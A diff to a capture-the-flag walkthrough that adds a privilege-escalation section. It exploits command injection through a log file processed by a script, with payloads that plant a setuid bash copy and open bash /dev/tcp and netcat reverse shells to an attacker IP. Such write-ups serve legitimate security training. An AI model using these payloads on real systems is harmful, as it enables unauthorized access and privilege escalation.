@@ -48,6 +48,26 @@ Once we press *generate* a reverse shell will be started on the metasploit handl
 In order to have a nicer shell, we can try to upgrade from a netcat to meterpreter shell.  
 We use the module multi/manage/shell_to_meterpreter and get a meterpreter shell. The user flag is under /home/kid.  
 
-We now want to escalate the privileges
+We now want to escalate the privileges  
 
+We see a scanlosers.sh in the /home/pwn directory that we can read. After a quick analysis of the file it is possible to see that the file /home/kid/logs/hackers is used to retrieve inputs to feed to scanlosers.sh.  
+Given that we (as kid) own the the file 'hackers', we may inject some command in the file and hope that it will be executed by the pwn user.  
+We can confirm that scanlosers.sh is in action by writing to the 'hackers' file. As we can see, the file get emptied immediately.  
+We can easily execute command in scanlosers.sh by using nested commands. Namely
+```
+echo 'ciao1 ciao2 $(/usr/bin/ping 10.10.14.20)' >> hackers
+```
+We receive the ping in the host machine, thus confirming the code injection.  
 
+```
+echo 'ciao ciao $(cp /bin/bash /home/pwn/bash; chmod +s /home/pwn/bash)' >> /home/kid/logs/hackers
+echo 'ciao ciao $( bash -i >& /dev/tcp/10.10.14.20/4449 0>&1)' >> /home/kid/logs/hackers
+echo 'ciao ciao $(nc -e /bin/sh 10.10.14.20 4242)' >> /home/kid/logs/hackers
+```
+
+```
+./bash -p
+```
+
+We are now the user pwn.  
+We set up the ssh keys to enter through ssh and have a more stable shell. We can the procede to root the box.
